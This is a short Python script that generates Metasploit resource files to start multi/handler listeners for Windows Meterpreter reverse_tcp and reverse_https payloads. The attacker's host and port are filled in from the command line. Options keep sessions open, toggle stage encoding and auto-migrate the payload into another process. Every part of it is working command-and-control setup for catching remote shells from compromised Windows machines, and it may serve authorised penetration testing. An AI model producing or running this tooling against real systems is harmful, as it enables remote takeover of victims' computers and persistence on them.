#!/usr/bin/env python
#
# StartListener.py
# Simple python script to start a Meterpreter HTTPs Handler
# by Chris Campbell (obscuresec)
#
import sys
import subprocess

def build(lhost,lport):
  listenerPath="/opt/local/malwaredefense"
#====================================================
  listenerFileName="{0}/{1}".format(listenerPath,"500-reverse_tcp_noenc.rc")
  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_tcp\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
  options += "set ExitOnSession false\n"
  options += "set EnableStageEncoding false\n"
  options += "exploit -j\n"
  filewrite = file(listenerFileName, "w")
  filewrite.write(options)
  filewrite.close()


#====================================================



  listenerFileName="{0}/{1}".format(listenerPath,"501-reversehttps.rc")
  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_https\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
  options += "set ExitOnSession false\n"
  options += "set EnableStageEncoding false\n"
  options += "set AutoRunScript post/windows/manage/smart_migrate\n"
  options += "exploit -j\n"
  filewrite = file(listenerFileName, "w")
  filewrite.write(options)
  filewrite.close()

#====================================================
  listenerFileName="{0}/{1}".format(listenerPath,"502-reverse_tcp.rc")
  options = "use multi/handler\n"
  options += "set payload windows/meterpreter/reverse_tcp\nset LHOST {0}\nset LPORT {1}\n".format(lhost,lport)
  options += "set ExitOnSession false\n"
  options += "set EnableStageEncoding true\n"
  options += "exploit -j\n"
  filewrite = file(listenerFileName, "w")
  filewrite.write(options)
  filewrite.close()
 





#grab args
try:
  lhost = sys.argv[1]
  lport = sys.argv[2]
  build(lhost,lport)

#index error
except IndexError:
  print "python StartListener.py lhost lport"




#unused code
#  subprocess.Popen("/usr/bin/msfconsole -r listener.rc", shell=True).wait()
